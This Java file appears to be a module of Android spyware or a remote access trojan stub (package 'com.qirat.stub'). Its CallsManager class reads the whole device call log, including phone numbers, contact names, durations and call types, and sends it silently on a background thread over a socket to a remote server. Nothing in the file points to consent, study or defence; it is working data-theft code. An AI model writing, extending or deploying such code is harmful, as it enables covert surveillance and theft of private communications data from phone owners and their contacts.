package com.qirat.stub;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CallsManager {

    private static final String TAG = "CallsManager";

    public static JSONObject getCallsLogs(Context context) {
        JSONObject calls = new JSONObject();
        JSONArray list = new JSONArray();
        Cursor cur = null;
        try {
            Uri allCalls = Uri.parse("content://call_log/calls");
            cur = context.getContentResolver().query(allCalls, null, null, null, null);

            if (cur == null) {
                Log.e(TAG, "Cursor is null.");
                return null;
            }

            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();
                String num = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String name = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                String duration = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                int type = cur.getInt(cur.getColumnIndexOrThrow(CallLog.Calls.TYPE));

                call.put("phoneNo", num);
                call.put("name", name == null ? "" : name);
                call.put("duration", duration);
                call.put("type", type);
                list.put(call);
            }
            calls.put("callsList", list);
            Log.d(TAG, "Call logs collection complete.");
            return calls;
        } catch (JSONException | IllegalArgumentException e) {
            Log.e(TAG, "Error getting call logs", e);
        } finally {
            if (cur != null) {
                cur.close();
            }
        }
        return null;
    }

    public static void sendCallLogsToServer(Context context) {
        new Thread(() -> {
            JSONObject callLogs = getCallsLogs(context);
            if (callLogs == null) {
                Log.e(TAG, "Cannot send call logs, the collected list is null.");
                return;
            }

            Socket socket = Socket.getInstance(context);
            if (socket.isConnected()) {
                Log.d(TAG, "Sending call logs to server...");
                socket.sendData("CALL_LOGS:" + callLogs.toString());
            } else {
                Log.e(TAG, "Cannot send call logs, socket not connected.");
            }
        }).start();
    }
}
